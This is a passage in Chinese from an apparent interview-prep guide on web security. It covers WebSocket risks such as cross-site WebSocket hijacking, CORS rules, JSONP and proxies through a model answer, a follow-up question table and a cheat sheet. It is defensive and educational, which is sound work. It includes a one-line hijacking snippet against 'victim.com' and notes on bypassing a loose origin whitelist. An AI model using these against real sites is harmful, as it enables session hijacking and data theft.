> "我会先讲一个最容易答错的点：**很多人以为 WebSocket 也受 CORS 保护，其实不是。** 握手是一个带 `Upgrade: websocket` 的 HTTP GET，浏览器会发 `Origin` 头，但**不会**因为 Origin 不匹配而阻止连接，也不会触发预检。所以防线必须自己补。
>
> **第一个风险是 CSWSH，跨站 WebSocket 劫持。** 攻击者在自己的页面里 `new WebSocket('wss://victim.com/ws')`，浏览器自动带上受害者的 Cookie，如果服务端只校验 Cookie 不校验 Origin，这个连接就被认为是受害者本人。而且 WebSocket 是双向的，攻击者能**读**消息，这比 CSRF（只能发请求）严重得多。防御就是校验 Origin 白名单，精确匹配。
>
> 这里有个细节：`Origin` 只能防浏览器发起的攻击，用脚本直接连是可以伪造 Origin 的，所以鉴权还是要靠 token。
>
> **第二个是传输安全**，必须 `wss://`。HTTPS 页面里用 `ws://` 会被当混合内容直接阻止。
>
> **第三个是认证方式**。三种：Cookie 自动带（方便但必须配 Origin 校验）、URL query 传 token（不推荐，会进服务器日志、代理日志、浏览器历史）、连接后第一条消息认证（推荐，最干净）。用首条消息认证时，服务端要在认证前拒绝所有其他消息，并设一个认证超时。
>
> **第四个是长连接的鉴权时效**。token 可能 15 分钟过期，但连接活了 8 小时。所以要么定时重新验证，要么在 token 过期时主动断开让客户端重连。
>
> **第五个是消息层**。客户端发来的一切都是不可信输入——要校验类型白名单、数据结构、长度、取值范围，不能直接拼 SQL 或 `innerHTML`。还要限制单条消息大小（防 DoS）、做频率限流、加心跳清理死连接。"

---

## 12. 追问表

| # | 追问 | 要点 |
|---|---|---|
| 1 | 同源的三要素？ | 协议 + 域名 + 端口 |
| 2 | 同源策略限制什么？ | 跨源**读**响应/DOM/Cookie；不限制发请求 |
| 3 | 为什么 CSRF 能成立？ | 因为发请求不受限制，只能靠 Token/SameSite |
| 4 | 简单请求的条件？ | 三方法 + 安全头 + 三种 Content-Type |
| 5 | 为什么会触发预检？ | 自定义头、`application/json`、非简单方法 |
| 6 | 预检能缓存吗？ | `Access-Control-Max-Age`，Chrome 上限 2 小时 |
| 7 | 带凭证时 ACAO 能是 `*` 吗？ | 不能，必须回显具体源 |
| 8 | CORS 能防 CSRF 吗？ | 不能，请求照发照执行，只阻止读响应 |
| 9 | 为什么白名单不能用 `includes`？ | `evil-victim.com` 能通过后缀匹配 |
| 10 | `Vary: Origin` 为什么重要？ | 防止 CDN 缓存串源 |
| 11 | 自定义响应头读不到怎么办？ | `Access-Control-Expose-Headers` |
| 12 | 预检能重定向吗？ | 不能，会报错 |
| 13 | JSONP 为什么淘汰？ | 只 GET、无自定义头、无错误处理、有 XSS 风险 |
| 14 | JSONP 的 XSS 怎么来的？ | callback 参数未校验，可注入任意 JS |
| 15 | 代理为什么最稳？ | 浏览器看来同源，无 CORS/Cookie 问题 |
| 16 | `changeOrigin` 作用？ | 改 Host 头，很多后端会校验 |
| 17 | WebSocket 受 CORS 保护吗？ | **不受**，握手不走 CORS |
| 18 | 什么是 CSWSH？ | 跨站 WebSocket 劫持，攻击者借用 Cookie 建立连接 |
| 19 | CSWSH 怎么防？ | 校验 Origin 白名单 + 鉴权 |
| 20 | Origin 校验能防脚本攻击吗？ | 不能，非浏览器可伪造 Origin；靠 token 鉴权 |
| 21 | WS 的 token 该放哪？ | 推荐首条消息；不要放 URL query |
| 22 | 长连接怎么处理 token 过期？ | 定时重验或过期主动断开 |
| 23 | `Sec-WebSocket-Key` 是鉴权吗？ | 不是，只防缓存/误连 |
| 24 | `SameSite=Lax` 能防 CSWSH 吗？ | 能挡一部分，但业务用 `None` 时失效，不能只靠它 |

---

## 13. 速记卡

```
【同源】
协议 + 域名 + 端口 三者相同
限制"跨源读"（响应/DOM/Cookie）｜不限制"跨源发"
→ CSRF 因此成立；JSONP 因此可行

【跨域四方案】
CORS        标准，服务端 ACAO 白名单（生产首选）
代理        最稳，Nginx / devServer，浏览器看来同源（生产首选）
JSONP       仅 GET、无自定义头、无错误处理、callback 未校验会 XSS → 淘汰
postMessage 窗口间通信，不是请求；接收方必须校验 origin

【CORS 两类请求】
简单：GET/HEAD/POST + 安全头 + 三种 Content-Type（含 text/plain）
预检：带 Authorization / application/json / PUT / DELETE → 先 OPTIONS

【CORS 三条硬规则】
带 Cookie → credentials:'include' + ACAO 必须是具体源（不能 *）+ Allow-Credentials:true
自定义响应头 → Access-Control-Expose-Headers
Max-Age 别太短（Chrome 上限 7200s），否则每请求多一次预检

【CORS 危险配置】
反射 req.headers.origin + credentials → 任何站都能读你的接口（比 CSRF 严重）
白名单用 includes/endsWith → evil-victim.com 绕过（用 Set.has）
漏 Vary: Origin → CDN 缓存串源

【WebSocket 核心认知】
握手是 HTTP GET + Upgrade，但**不受同源策略约束、不走 CORS**
浏览器会发 Origin，但不会因不匹配而阻止 → 必须服务端自己校验

【CSWSH】
攻击者页面 new WebSocket('wss://victim.com/ws')
浏览器自动带 Cookie → 服务端只验 Cookie 就中招
危害 > CSRF：能**读**消息 + 持久连接
防御：Origin 白名单（防浏览器）+ token 鉴权（防脚本伪造 Origin）

【WS 十条】
wss:// ｜ 校验 Origin ｜ 握手鉴权（首条消息最优）
token 不放 URL ｜ 认证超时 ｜ 限制消息大小与频率
校验每条消息类型/结构 ｜ 心跳 ｜ token 过期主动断开
不信任 Sec-WebSocket-Key
```
